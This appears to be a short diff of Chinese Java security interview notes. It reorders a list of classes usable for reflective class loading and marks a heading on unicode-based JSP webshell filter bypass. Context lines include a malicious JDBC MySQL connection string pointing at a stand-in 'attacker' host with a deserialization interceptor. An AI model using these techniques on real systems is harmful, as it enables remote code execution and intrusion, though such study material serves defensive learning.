@@ -25,9 +25,9 @@ field.set(null, newValue);
 可以使用的类和方法如下（参考三梦师傅）
 
 ```java
+ClassLoader.loadClass
 ReflectUtil.forName
 BytecodeDescriptor
-ClassLoader.loadClass
 sun.reflect.misc.MethodUtil
 sun.reflect.misc.FieldUtil
 sun.reflect.misc.ConstructorUtil
@@ -326,7 +326,7 @@ jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.Server
 
 
 
-### 是否了解利用unicode特性的JSP Webshell绕过（★★★）
+### 是否了解利用unicode特性的JSP Webshell绕过（★★★）[+]
 
 编译`JSP`时其中的`unicode`会进行解码，其中`\u000a`变成换行，导致后面的`exec`可以执行
 
